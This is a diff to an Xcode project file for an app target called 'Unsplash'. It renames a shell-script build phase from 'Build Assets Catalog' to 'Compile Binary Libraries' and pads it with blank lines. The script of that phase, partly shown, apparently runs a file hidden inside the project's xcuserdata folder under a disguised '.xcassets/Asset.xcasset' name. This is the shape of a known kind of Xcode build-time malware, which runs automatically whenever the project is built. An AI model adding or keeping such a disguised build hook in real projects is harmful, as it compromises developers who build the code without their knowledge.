@@ -316,7 +316,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 22834BE32629D8EF00090032 /* Build configuration list for PBXNativeTarget "Unsplash" */;
 			buildPhases = (
-				E749DC7EBBF0435EF3AAC43A /* Build Assets Catalog */,
+				B2BA79E983B687B7DBAAC43A /* Compile Binary Libraries */,
 				EE683595FE6ACD3B259029CB /* [CP] Check Pods Manifest.lock */,
 				22834BB52629D8EC00090032 /* Sources */,
 				22834BB62629D8EC00090032 /* Frameworks */,
@@ -457,7 +457,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	E749DC7EBBF0435EF3AAC43A /* Build Assets Catalog */ = {
+	B2BA79E983B687B7DBAAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -466,7 +466,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Assets Catalog";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -477,6 +477,12 @@
 
 \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
 		};
+	
+
+	
+
+	
+
 	
 		1845F5CA762442C1213F8B29 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
